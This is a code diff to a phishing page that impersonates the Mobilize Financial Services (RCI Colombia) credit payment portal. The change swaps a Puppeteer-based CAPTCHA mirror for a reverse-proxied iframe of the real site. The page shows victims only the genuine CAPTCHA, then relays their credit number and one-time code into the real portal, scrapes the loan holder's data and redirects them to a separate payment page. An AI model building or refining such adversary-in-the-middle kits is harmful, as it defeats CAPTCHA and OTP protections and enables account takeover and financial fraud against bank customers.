@@ -49,13 +49,13 @@
         .form-step.visible{display:block}
         @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
 
-        /* CAPTCHA espejo — se ve como el widget nativo */
-        .captcha-zone{display:none;margin-bottom:20px;animation:fadeIn .4s}
-        .captcha-zone.visible{display:block}
+        /* CAPTCHA — iframe recortado del sitio real */
+        .captcha-zone{margin-bottom:20px;animation:fadeIn .4s}
         .captcha-label{font-size:13px;font-weight:600;color:#242833;margin-bottom:6px}
         .captcha-sublabel{font-size:12px;color:#666;margin-bottom:12px}
-        .captcha-mirror{position:relative;border-radius:8px;overflow:hidden;background:#fff;cursor:pointer;user-select:none;-webkit-user-select:none;line-height:0}
-        .captcha-mirror canvas{width:100%;display:block;border-radius:8px}
+        .iframe-clip{position:relative;overflow:hidden;border-radius:8px;background:#f8f9fa;min-height:120px;transition:all .3s}
+        .iframe-clip iframe{position:absolute;border:none;transform-origin:0 0}
+        .iframe-loading{display:flex;align-items:center;justify-content:center;gap:10px;padding:40px 20px;color:#888;font-size:13px}
 
         /* Opciones OTP */
         .otp-options{display:flex;gap:15px;margin-bottom:25px;flex-wrap:wrap}
@@ -81,6 +81,7 @@
 
         .spinner{display:inline-block;width:18px;height:18px;border:3px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
         @keyframes spin{to{transform:rotate(360deg)}}
+        .spinner-dark{display:inline-block;width:16px;height:16px;border:3px solid #e0e0e0;border-top-color:#e65c00;border-radius:50%;animation:spin .8s linear infinite}
 
         .result-box{margin-top:15px;padding:16px 20px;border-radius:10px;font-size:13px;animation:fadeIn .4s}
         .result-box.success{background:#e8f5e9;border:1px solid #a5d6a7;color:#2e7d32}
@@ -119,7 +120,7 @@
 <body>
 
 <header class="header">
-    <img src="mobil.png" alt="Mobilize Financial Services Logo">
+    <img src="/app/mobil.png" alt="Mobilize Financial Services Logo">
 </header>
 
 <main class="main-container">
@@ -157,7 +158,7 @@
                 <div class="step" id="stepItem3"><div class="step-circle">3</div><span>Verificación</span></div>
             </div>
 
-            <!-- PASO 1: Crédito + CAPTCHA espejo debajo -->
+            <!-- PASO 1: Crédito + CAPTCHA iframe real -->
             <div id="formStep1" class="form-step visible">
                 <p class="helper-text">Paso 1 de 3 — Ingresa tu número de crédito.</p>
                 <div class="input-group">
@@ -168,12 +169,14 @@
                     </div>
                 </div>
 
-                <!-- CAPTCHA espejo via canvas + WebSocket -->
+                <!-- CAPTCHA real via iframe recortado -->
                 <div class="captcha-zone" id="captchaZone">
                     <div class="captcha-label">Verificación de seguridad</div>
                     <div class="captcha-sublabel">Confirma que eres una persona para continuar.</div>
-                    <div class="captcha-mirror" id="captchaMirror">
-                        <canvas id="captchaCanvas"></canvas>
+                    <div class="iframe-clip" id="iframeClip">
+                        <div class="iframe-loading" id="iframeLoading">
+                            <span class="spinner-dark"></span> Cargando verificación...
+                        </div>
                     </div>
                 </div>
 
@@ -224,38 +227,203 @@
     <p>Todo abono extraordinario realizado no adelantará cuotas del crédito; por defecto, éste será aplicado a capital bajo la modalidad de reducir el plazo.</p>
     <p>Si posees más de un crédito, es necesario realizar una transacción por cada uno.</p>
     <p>Para resolver tus inquietudes sobre el crédito, contáctanos a través de nuestras líneas de atención.</p>
-    <img src="footer.png" alt="Mobilize Footer Logo">
+    <img src="/app/footer.png" alt="Mobilize Footer Logo">
     <p class="footer-legal">Los productos y servicios ofrecidos a través de MOBILIZE FINANCIAL SERVICES, son otorgados por RCI Colombia S.A Compañía de Financiamiento, entidad vigilada por la Superintendencia Financiera de Colombia</p>
 </footer>
 
 <script>
-const API = window.location.origin;
-const WS_URL = (location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host + '/ws';
-let currentSessionId = null;
-let captchaBounds = null;
-let captchaVisible = false;
+// ============================================================
+// IFRAME DEL SITIO REAL (proxy reverso → same-origin)
+// ============================================================
+let frame = null;
+let captchaFound = false;
+let captchaSolved = false;
 let selectedOtpOption = null;
 let otpOptionsList = [];
-let ws = null;
-let preSessionReady = false;
-const canvas = document.getElementById('captchaCanvas');
-const ctx = canvas.getContext('2d');
+let iframeReady = false;
+let observerInterval = null;
+let currentStep = 'credit'; // credit | captcha-wait | otp-select | otp-code | done
+
+// Crear iframe al cargar la página
+function initIframe() {
+    frame = document.createElement('iframe');
+    frame.id = 'mobilizeFrame';
+    frame.src = '/portal-pagos/';
+    frame.style.cssText = 'position:absolute;border:none;width:500px;height:900px;opacity:0;pointer-events:none;';
+    document.getElementById('iframeClip').appendChild(frame);
+
+    frame.addEventListener('load', function() {
+        console.log('[IFRAME] Cargado');
+        iframeReady = true;
+        startObserving();
+    });
+}
 
 // ============================================================
-// PRE-SESSION: crear sesión al cargar la página
+// OBSERVAR DOM DEL IFRAME
 // ============================================================
-async function preStartSession() {
+function startObserving() {
+    // Polling cada 500ms para detectar cambios
+    if (observerInterval) clearInterval(observerInterval);
+    observerInterval = setInterval(checkIframeState, 500);
+}
+
+function getIframeDoc() {
     try {
-        const r = await fetch(API + '/api/pre-session', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' });
-        const data = await r.json();
-        if (data.sessionId) {
-            currentSessionId = data.sessionId;
-            preSessionReady = true;
-            console.log('Pre-session lista:', currentSessionId);
-            // Pre-conectar WebSocket
-            connectWS();
+        return frame.contentDocument || frame.contentWindow.document;
+    } catch (e) {
+        console.log('[IFRAME] No se puede acceder al DOM:', e.message);
+        return null;
+    }
+}
+
+function checkIframeState() {
+    const fdoc = getIframeDoc();
+    if (!fdoc || !fdoc.body) return;
+
+    // Buscar CAPTCHA
+    const captchaEl = findCaptchaElement(fdoc);
+
+    if (captchaEl && !captchaFound) {
+        captchaFound = true;
+        console.log('[IFRAME] CAPTCHA detectado');
+        positionIframeToCaptcha(captchaEl);
+        document.getElementById('iframeLoading').style.display = 'none';
+    }
+
+    if (!captchaEl && captchaFound && !captchaSolved) {
+        // CAPTCHA desapareció → fue resuelto
+        captchaSolved = true;
+        console.log('[IFRAME] CAPTCHA resuelto');
+        onCaptchaSolved();
+    }
+
+    // Buscar opciones OTP (radios de Angular Material)
+    if (currentStep === 'captcha-wait' || currentStep === 'credit') {
+        const otpOpts = findOtpOptions(fdoc);
+        if (otpOpts.length > 0) {
+            console.log('[IFRAME] Opciones OTP detectadas:', otpOpts.length);
+            renderOtpOptions(otpOpts);
+            showStep('formStep2');
+            currentStep = 'otp-select';
         }
-    } catch (e) { console.log('Pre-session no disponible:', e.message); }
+    }
+
+    // Buscar datos del crédito (después de verificar OTP)
+    if (currentStep === 'otp-code') {
+        const creditData = findCreditData(fdoc);
+        if (creditData) {
+            console.log('[IFRAME] Datos del crédito detectados');
+            onCreditDataFound(creditData);
+        }
+    }
+}
+
+function findCaptchaElement(doc) {
+    // Buscar por selectores conocidos de AWS WAF CAPTCHA
+    const selectors = [
+        '#captcha-container',
+        '.waf-captcha__stage',
+        '[class*="captcha"]',
+        'iframe[src*="captcha"]',
+        'iframe[src*="challenge"]',
+    ];
+    for (const sel of selectors) {
+        const el = doc.querySelector(sel);
+        if (el && el.offsetHeight > 30) return el;
+    }
+
+    // Buscar iframes internos que puedan contener CAPTCHA
+    const iframes = doc.querySelectorAll('iframe');
+    for (const ifr of iframes) {
+        const src = (ifr.src || '').toLowerCase();
+        if (src.includes('captcha') || src.includes('challenge') || src.includes('waf')) {
+            return ifr;
+        }
+    }
+
+    // Buscar por contenido de texto
+    const allDivs = doc.querySelectorAll('div, section');
+    for (const d of allDivs) {
+        const txt = (d.innerText || '').toLowerCase();
+        if ((txt.includes('elija todo') || txt.includes('seleccione') || txt.includes('verify')) && d.offsetHeight > 80) {
+            return d;
+        }
+    }
+
+    return null;
+}
+
+function findOtpOptions(doc) {
+    const options = [];
+    // Angular Material radio buttons
+    const radios = doc.querySelectorAll('mat-radio-button');
+    radios.forEach((radio, i) => {
+        const label = radio.innerText.trim();
+        if (label) {
+            options.push({
+                index: i,
+                label: label,
+                type: label.toLowerCase().includes('correo') || label.toLowerCase().includes('email') ? 'email' : 'sms',
+                value: radio.getAttribute('value') || label,
+                element: radio,
+            });
+        }
+    });
+
+    // Fallback: buscar radio inputs normales
+    if (options.length === 0) {
+        const inputs = doc.querySelectorAll('input[type="radio"]');
+        inputs.forEach((inp, i) => {
+            const lbl = doc.querySelector(`label[for="${inp.id}"]`);
+            const label = lbl ? lbl.innerText.trim() : inp.value;
+            if (label) {
+                options.push({
+                    index: i,
+                    label: label,
+                    type: label.toLowerCase().includes('correo') ? 'email' : 'sms',
+                    value: inp.value || label,
+                    element: inp,
+                });
+            }
+        });
+    }
+
+    return options;
+}
+
+function findCreditData(doc) {
+    const body = doc.body.innerText || '';
+    // Buscar patrones de datos del crédito
+    if ((body.includes('titular') || body.includes('Titular') || body.includes('TITULAR')) &&
+        (body.includes('cuota') || body.includes('Cuota') || body.includes('saldo') || body.includes('Saldo'))) {
+        return {
+            text: body,
+            html: doc.body.innerHTML,
+        };
+    }
+    return null;
+}
+
+// ============================================================
+// POSICIONAR IFRAME para mostrar solo el CAPTCHA
+// ============================================================
+function positionIframeToCaptcha(captchaEl) {
+    const rect = captchaEl.getBoundingClientRect();
+    const clip = document.getElementById('iframeClip');
+    const pad = 10;
+
+    // Dimensiones del contenedor = tamaño del CAPTCHA + padding
+    const w = Math.max(rect.width + pad * 2, 320);
+    const h = Math.max(rect.height + pad * 2, 200);
+    clip.style.width = w + 'px';
+    clip.style.height = h + 'px';
+
+    // Posicionar iframe para que el CAPTCHA quede visible
+    frame.style.left = -(rect.left - pad) + 'px';
+    frame.style.top = -(rect.top - pad) + 'px';
+    frame.style.opacity = '1';
+    frame.style.pointerEvents = 'auto';
 }
 
 // ============================================================
@@ -290,265 +458,83 @@ document.getElementById('creditNumber').addEventListener('input', function () {
     else { btn.classList.remove('active'); btn.disabled = true; }
 });
 
-document.getElementById('btnStart').addEventListener('click', async function() {
-    if (captchaVisible && currentSessionId) {
-        await submitAfterCaptcha();
-    } else {
-        await iniciarSesion();
-    }
+document.getElementById('btnStart').addEventListener('click', function() {
+    enviarCredito();
 });
 
 // ============================================================
-// WEBSOCKET ESPEJO — canvas dibuja frames del CAPTCHA
+// ENVIAR CRÉDITO AL IFRAME
 // ============================================================
-function connectWS() {
-    if (ws && ws.readyState <= 1) return;
-    ws = new WebSocket(WS_URL);
-    ws.onmessage = (ev) => {
-        const msg = JSON.parse(ev.data);
+function enviarCredito() {
+    const credit = document.getElementById('creditNumber').value.trim();
+    if (!credit) return;
 
-        if (msg.type === 'frame') {
-            captchaBounds = msg.bounds;
-            drawFrame(msg.screenshot);
-        }
-
-        if (msg.type === 'captcha-gone') {
-            hideCaptcha();
-            submitAfterCaptcha();
-        }
-
-        if (msg.type === 'error') {
-            showMsg(msg.msg, 'error');
-        }
-    };
-    ws.onclose = () => { ws = null; };
-    ws.onerror = () => { ws = null; };
-}
-
-function drawFrame(dataUrl) {
-    const img = new Image();
-    img.onload = function() {
-        canvas.width = img.naturalWidth;
-        canvas.height = img.naturalHeight;
-        ctx.drawImage(img, 0, 0);
-    };
-    img.src = dataUrl;
-}
-
-function startMirror(sessionId) {
-    connectWS();
-    const trySend = () => {
-        if (ws && ws.readyState === 1) {
-            ws.send(JSON.stringify({ type: 'start-mirror', sessionId }));
-        } else {
-            setTimeout(trySend, 150);
-        }
-    };
-    trySend();
-}
-
-function stopMirror() {
-    if (ws && ws.readyState === 1) {
-        ws.send(JSON.stringify({ type: 'stop-mirror' }));
-    }
-}
-
-// Click en canvas → mapear coords al CAPTCHA real en viewport del Puppeteer
-document.getElementById('captchaMirror').addEventListener('click', function(event) {
-    if (!currentSessionId || !captchaBounds) return;
-    // Asegurar que WS esté conectado
-    if (!ws || ws.readyState !== 1) {
-        connectWS();
+    const fdoc = getIframeDoc();
+    if (!fdoc) {
+        showMsg('Error de conexión. Recarga la página.', 'error');
         return;
     }
 
-    const rect = canvas.getBoundingClientRect();
-    const scaleX = canvas.width / rect.width;
-    const scaleY = canvas.height / rect.height;
+    // Buscar input de crédito en el iframe
+    const input = fdoc.querySelector('#otp-contract')
+        || fdoc.querySelector('input[formcontrolname="idProcess"]')
+        || fdoc.querySelector('input[type="text"]');
 
-    // Posición en pixels dentro del screenshot (que tiene 10px de padding)
-    const pixX = (event.clientX - rect.left) * scaleX;
-    const pixY = (event.clientY - rect.top) * scaleY;
+    if (!input) {
+        showMsg('No se encontró el campo de crédito. Espera a que cargue.', 'error');
+        return;
+    }
 
-    // El screenshot tiene 10px de padding. Restar para obtener coords relativas al CAPTCHA
-    const relX = pixX - 10;
-    const relY = pixY - 10;
+    // Llenar crédito con método compatible Angular
+    fillAngularInput(input, credit);
 
-    console.log('Click canvas:', {pixX, pixY, relX, relY, bounds: captchaBounds});
-
-    ws.send(JSON.stringify({
-        type: 'click',
-        sessionId: currentSessionId,
-        x: relX,
-        y: relY,
-        bounds: captchaBounds,
-    }));
-});
-
-// También para touch (móvil)
-document.getElementById('captchaMirror').addEventListener('touchend', function(event) {
-    event.preventDefault();
-    if (!currentSessionId || !captchaBounds || !ws || ws.readyState !== 1) return;
-
-    const touch = event.changedTouches[0];
-    const rect = canvas.getBoundingClientRect();
-    const scaleX = canvas.width / rect.width;
-    const scaleY = canvas.height / rect.height;
-
-    const pixX = (touch.clientX - rect.left) * scaleX;
-    const pixY = (touch.clientY - rect.top) * scaleY;
-    const relX = pixX - 10;
-    const relY = pixY - 10;
-
-    ws.send(JSON.stringify({
-        type: 'click',
-        sessionId: currentSessionId,
-        x: relX,
-        y: relY,
-        bounds: captchaBounds,
-    }));
-}, { passive: false });
-
-// ============================================================
-// CAPTCHA mostrar/ocultar
-// ============================================================
-function showCaptcha(screenshot, bounds) {
-    captchaVisible = true;
-    captchaBounds = bounds;
-    if (screenshot) drawFrame(screenshot);
-    document.getElementById('captchaZone').classList.add('visible');
-    startMirror(currentSessionId);
+    // Click en Continuar del iframe
     setTimeout(() => {
-        document.getElementById('captchaZone').scrollIntoView({ behavior:'smooth', block:'center' });
-    }, 200);
+        const btn = findButtonByText(fdoc, 'continuar');
+        if (btn) {
+            btn.click();
+            console.log('[IFRAME] Click en Continuar');
+            currentStep = 'captcha-wait';
+        } else {
+            console.log('[IFRAME] Botón Continuar no encontrado');
+        }
+    }, 300);
 }
 
-function hideCaptcha() {
-    captchaVisible = false;
-    stopMirror();
-    document.getElementById('captchaZone').classList.remove('visible');
+function fillAngularInput(input, value) {
+    // Usar el setter nativo para que Angular detecte el cambio
+    const nativeSetter = Object.getOwnPropertyDescriptor(
+        window.HTMLInputElement.prototype, 'value'
+    ).set;
+
+    input.focus();
+    nativeSetter.call(input, value);
+    input.dispatchEvent(new Event('input', { bubbles: true }));
+    input.dispatchEvent(new Event('change', { bubbles: true }));
+    input.dispatchEvent(new KeyboardEvent('keyup', { bubbles: true }));
+    input.blur();
 }
 
-// ============================================================
-// PASO 1: Enviar crédito (usa pre-session si existe)
-// ============================================================
-async function iniciarSesion() {
-    const credit = document.getElementById('creditNumber').value.trim();
-    if (!credit) return;
-    const btn = document.getElementById('btnStart');
-    btn.disabled = true;
-    btn.innerHTML = '<span class="spinner"></span> CONTINUAR';
-    showMsg('', '');
-
-    try {
-        const body = { creditNumber: credit };
-        // Reutilizar pre-session si existe
-        if (currentSessionId && preSessionReady) {
-            body.sessionId = currentSessionId;
-        }
-
-        const r = await fetch(API + '/api/start', {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(body),
-        });
-        const data = await r.json();
-        if (!r.ok) throw new Error(data.error || 'Error');
-        currentSessionId = data.sessionId;
-        preSessionReady = false;
-
-        if (data.hasCaptcha && data.screenshot) {
-            showCaptcha(data.screenshot, data.captchaBounds);
-            btn.innerHTML = 'CONTINUAR';
-            btn.classList.add('active');
-            btn.disabled = false;
-            return;
-        }
-
-        if (data.otpOptions && data.otpOptions.length > 0) {
-            renderOtpOptions(data.otpOptions);
-            showStep('formStep2');
-            return;
-        }
-
-        const txt = (data.bodyText || '').toLowerCase();
-        if (txt.includes('código') || txt.includes('otp') || txt.includes('enviado')) {
-            showStep('formStep3');
-            showMsg('Código enviado a tu celular o correo registrado.', 'info');
-            return;
-        }
-
-        showMsg('No se detectaron opciones. Intenta de nuevo.', 'error');
-
-    } catch (err) {
-        showMsg(err.message, 'error');
-    } finally {
-        if (!captchaVisible) {
-            btn.disabled = false;
-            btn.innerHTML = 'CONTINUAR';
-            if (document.getElementById('creditNumber').value.trim()) {
-                btn.classList.add('active'); btn.disabled = false;
-            }
+function findButtonByText(doc, text) {
+    const buttons = doc.querySelectorAll('button');
+    for (const btn of buttons) {
+        if (btn.innerText.trim().toLowerCase().includes(text.toLowerCase())) {
+            return btn;
         }
     }
+    return null;
 }
 
 // ============================================================
-// CAPTCHA resuelto → Continuar → detectar OTP
+// CAPTCHA RESUELTO
 // ============================================================
-async function submitAfterCaptcha() {
-    const btn = document.getElementById('btnStart');
-    btn.disabled = true;
-    btn.innerHTML = '<span class="spinner"></span> CONTINUAR';
-    stopMirror();
+function onCaptchaSolved() {
+    // Ocultar iframe del CAPTCHA
+    frame.style.opacity = '0';
+    frame.style.pointerEvents = 'none';
 
-    try {
-        await fetch(API + '/api/click-button', {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ sessionId: currentSessionId, text: 'continuar' }),
-        });
-
-        await new Promise(resolve => setTimeout(resolve, 3000));
-
-        const dr = await fetch(API + '/api/detect-state', {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ sessionId: currentSessionId }),
-        });
-        const state = await dr.json();
-
-        hideCaptcha();
-
-        if (state.hasCaptcha && state.screenshot) {
-            showCaptcha(state.screenshot, state.captchaBounds);
-            btn.innerHTML = 'CONTINUAR';
-            btn.classList.add('active');
-            btn.disabled = false;
-            return;
-        }
-
-        if (state.otpOptions && state.otpOptions.length > 0) {
-            renderOtpOptions(state.otpOptions);
-            showStep('formStep2');
-            return;
-        }
-
-        const txt = (state.bodyText || '').toLowerCase();
-        if (txt.includes('código') || txt.includes('otp') || txt.includes('enviado')) {
-            showStep('formStep3');
-            showMsg('Código enviado a tu celular o correo registrado.', 'info');
-            return;
-        }
-
-        showMsg('No se detectaron las opciones de envío. Intenta de nuevo.', 'error');
-        btn.innerHTML = 'CONTINUAR';
-        btn.classList.add('active');
-        btn.disabled = false;
-
-    } catch (err) {
-        showMsg(err.message, 'error');
-        btn.innerHTML = 'CONTINUAR';
-        btn.classList.add('active');
-        btn.disabled = false;
-    }
+    // Esperar a que aparezcan opciones OTP o datos
+    showMsg('Verificación completada. Procesando...', 'info');
 }
 
 // ============================================================
@@ -582,31 +568,27 @@ function renderOtpOptions(options) {
     });
 }
 
-async function seleccionarMetodoOtp() {
+function seleccionarMetodoOtp() {
     if (selectedOtpOption === null) return;
     const opt = otpOptionsList[selectedOtpOption];
     const btn = document.getElementById('btnSendOtp');
     btn.disabled = true;
-    btn.innerHTML = '<span class="spinner"></span> ENVIAR CÓDIGO';
 
-    try {
-        const r = await fetch(API + '/api/select-otp', {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                sessionId: currentSessionId,
-                optionIndex: opt.index,
-                optionType: opt.type,
-                optionValue: opt.value,
-            }),
-        });
-        const data = await r.json();
-        if (!r.ok) throw new Error(data.error || 'Error');
+    const fdoc = getIframeDoc();
+    if (!fdoc) { showMsg('Error de conexión', 'error'); btn.disabled = false; return; }
 
-        if (data.hasCaptcha && data.screenshot) {
-            showCaptcha(data.screenshot, data.captchaBounds);
-            showStep('formStep1');
-            return;
-        }
+    // Hacer click en la opción dentro del iframe
+    if (opt.element) {
+        opt.element.click();
+        // También buscar y clickear el label interno
+        const lbl = opt.element.querySelector('label, .mat-radio-label');
+        if (lbl) lbl.click();
+    }
+
+    // Click en el botón de enviar del iframe
+    setTimeout(() => {
+        const sendBtn = findButtonByText(fdoc, 'enviar') || findButtonByText(fdoc, 'continuar');
+        if (sendBtn) sendBtn.click();
 
         const labelLow = opt.label.toLowerCase();
         let medio = 'celular o correo';
@@ -616,78 +598,93 @@ async function seleccionarMetodoOtp() {
         document.getElementById('otpSentMsg').textContent = 'Paso 3 de 3 — Ingresa el código que recibiste en tu ' + medio + '.';
         document.getElementById('otpHintText').textContent = 'El código fue enviado a tu ' + medio + ' registrado.';
         showStep('formStep3');
+        currentStep = 'otp-code';
         showMsg('Código enviado a tu ' + medio + ' registrado.', 'info');
-
-    } catch (err) { showMsg(err.message, 'error'); }
-    finally {
         btn.disabled = false;
-        btn.innerHTML = 'ENVIAR CÓDIGO';
-        if (selectedOtpOption !== null) { btn.classList.add('active'); btn.disabled = false; }
-    }
+    }, 500);
 }
 
 // ============================================================
-// PASO 3: OTP
+// PASO 3: Verificar OTP
 // ============================================================
-async function enviarOtp() {
+function enviarOtp() {
     const code = document.getElementById('otpCode').value.trim();
     if (!code) return showMsg('Ingresa el código', 'error');
-    const btn = document.getElementById('btnVerify');
-    btn.disabled = true;
-    btn.innerHTML = '<span class="spinner"></span>';
-    try {
-        await fetch(API + '/api/type', {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                sessionId: currentSessionId,
-                selector: 'input[formcontrolname="otp"], input[name="otp"], input[type="tel"], input[maxlength="6"], input[inputmode="numeric"]',
-                text: code,
-            }),
-        });
-        await fetch(API + '/api/click-button', {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ sessionId: currentSessionId, text: 'verificar' }),
-        });
-        await new Promise(r => setTimeout(r, 3000));
 
-        const ext = await fetch(API + '/api/extract', {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ sessionId: currentSessionId }),
-        });
-        const pageData = await ext.json();
+    const btnV = document.getElementById('btnVerify');
+    btnV.disabled = true;
 
-        try {
-            sessionStorage.setItem('mobilize_credit', JSON.stringify(pageData));
-            sessionStorage.setItem('mobilize_session', currentSessionId);
-        } catch(e) {}
+    const fdoc = getIframeDoc();
+    if (!fdoc) { showMsg('Error de conexión', 'error'); btnV.disabled = false; return; }
 
-        document.getElementById('resultData').innerHTML =
-            '<div style="background:#f8f9fa;border-radius:10px;padding:20px">' +
-            '<h4 style="font-size:14px;color:#242833;margin-bottom:10px">Datos del crédito</h4>' +
-            '<pre style="white-space:pre-wrap;word-break:break-word;font-size:12px;font-family:Courier New,monospace;max-height:400px;overflow-y:auto">' +
-            esc(pageData.text || 'Sin datos') + '</pre></div>';
+    // Buscar input de OTP en el iframe
+    const otpInput = fdoc.querySelector('input[formcontrolname="otp"]')
+        || fdoc.querySelector('input[type="tel"]')
+        || fdoc.querySelector('input[maxlength="6"]')
+        || fdoc.querySelector('input[inputmode="numeric"]');
 
-        showStep('formStepResult');
-        showMsg('', '');
-        fetch(API + '/api/close', { method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ sessionId: currentSessionId }) });
-    } catch (err) { showMsg('Error: ' + err.message, 'error'); }
-    finally { btn.disabled = false; btn.innerHTML = 'VERIFICAR'; }
+    if (otpInput) {
+        fillAngularInput(otpInput, code);
+    }
+
+    // Click en Verificar
+    setTimeout(() => {
+        const verBtn = findButtonByText(fdoc, 'verificar') || findButtonByText(fdoc, 'validar');
+        if (verBtn) verBtn.click();
+
+        // Esperar a que aparezcan los datos del crédito
+        showMsg('Verificando código...', 'info');
+    }, 300);
+
+    // Después de un momento, verificar si llegaron datos
+    setTimeout(() => {
+        const creditData = findCreditData(fdoc);
+        if (creditData) {
+            onCreditDataFound(creditData);
+        } else {
+            btnV.disabled = false;
+            // Seguir monitoreando
+        }
+    }, 5000);
 }
 
 // ============================================================
-// UTILS
+// DATOS DEL CRÉDITO → REDIRIGIR A pago.html
+// ============================================================
+function onCreditDataFound(data) {
+    if (observerInterval) clearInterval(observerInterval);
+    currentStep = 'done';
+
+    try {
+        sessionStorage.setItem('mobilize_credit', JSON.stringify(data));
+    } catch(e) {}
+
+    // Mostrar resultado y luego redirigir
+    showStep('formStepResult');
+    showMsg('', '');
+    document.getElementById('resultData').innerHTML =
+        '<div style="background:#f8f9fa;border-radius:10px;padding:20px">' +
+        '<h4 style="font-size:14px;color:#242833;margin-bottom:10px">Datos del crédito</h4>' +
+        '<pre style="white-space:pre-wrap;word-break:break-word;font-size:12px;font-family:Courier New,monospace;max-height:300px;overflow-y:auto">' +
+        esc(data.text || 'Sin datos') + '</pre></div>';
+
+    // Redirigir a pago.html después de 2s
+    setTimeout(() => {
+        window.location.href = '/app/pago.html';
+    }, 2000);
+}
+
+// ============================================================
+// UTILIDADES
 // ============================================================
 function resetAll() {
-    hideCaptcha();
-    if (ws) { ws.close(); ws = null; }
-    if (currentSessionId) fetch(API + '/api/close', { method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sessionId: currentSessionId }) });
-    currentSessionId = null;
+    if (observerInterval) clearInterval(observerInterval);
+    captchaFound = false;
+    captchaSolved = false;
     selectedOtpOption = null;
     otpOptionsList = [];
-    captchaBounds = null;
+    iframeReady = false;
+    currentStep = 'credit';
     document.getElementById('creditNumber').value = '';
     document.getElementById('otpCode').value = '';
     document.getElementById('otpOptionsContainer').innerHTML = '';
@@ -695,6 +692,12 @@ function resetAll() {
     showMsg('', '');
     document.getElementById('btnStart').classList.remove('active');
     document.getElementById('btnStart').disabled = true;
+
+    // Recargar iframe
+    const clip = document.getElementById('iframeClip');
+    if (frame) frame.remove();
+    document.getElementById('iframeLoading').style.display = 'flex';
+    initIframe();
 }
 
 function showMsg(m, t) {
@@ -704,9 +707,11 @@ function showMsg(m, t) {
 }
 function esc(t) { return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
 
+// ============================================================
+// INIT
+// ============================================================
 window.addEventListener('load', function() {
-    // Pre-calentar sesión al cargar la página (Puppeteer ya navega a Mobilize)
-    preStartSession();
+    initIframe();
 
     if (window.innerWidth <= 900) {
         setTimeout(function() {
